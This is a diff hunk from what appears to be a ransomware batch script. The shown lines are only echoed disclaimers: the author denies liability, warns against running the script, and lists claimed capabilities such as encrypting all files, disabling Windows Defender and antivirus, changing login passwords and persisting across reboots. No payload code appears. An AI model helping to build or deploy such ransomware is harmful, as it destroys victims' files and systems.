@@ -50,9 +50,9 @@ echo The author of this code (Anion15) assumes no responsibility if this code is
 echo ALL USERS OF THIS CODE ARE RESPONSIBLE AND DEFINES THE IMPLIED AGREEMENT THAT THE USERS OF THIS CODE, THAT THE USER, ARE LIABLE FOR ALL DAMAGES THAT MAY BE RESULTING IN THE FUTURE. 
 echo Therefore, I swear by this letter that the authors of this code will not be punished in case of legal trouble. 
 echo I will consider it as a material that can serve as evidence in the future. 
-echo It is judged that the user is also aware that if they abuse this and cause harm to others, they may be subject to severe legal punishment. 
+echo It is judged that the user is also aware that i.f they abuse this and cause harm to others, they may be subject to severe legal punishment. 
 echo Recognize the dangers of this code and handle it with care. Don't run it on your own computer. 
-echo Ransomware can infect your computer. If you are infected, please recover by referring to the #recovery key below. 
+echo Ransomware can infect your computer. I.f you are infected, please recover by referring to the #recovery key below. 
 echo This virus is very difficult to recover and can be dangerous if used for real attack purposes.
 echo There are many more risks like encrypting all files, disabling Windows defense, disabling computer antivirus similar to several antiviruses, changing computer login password, etc. 
 echo Use with caution. For reference, this virus comes back to life even if the computer is rebooted.
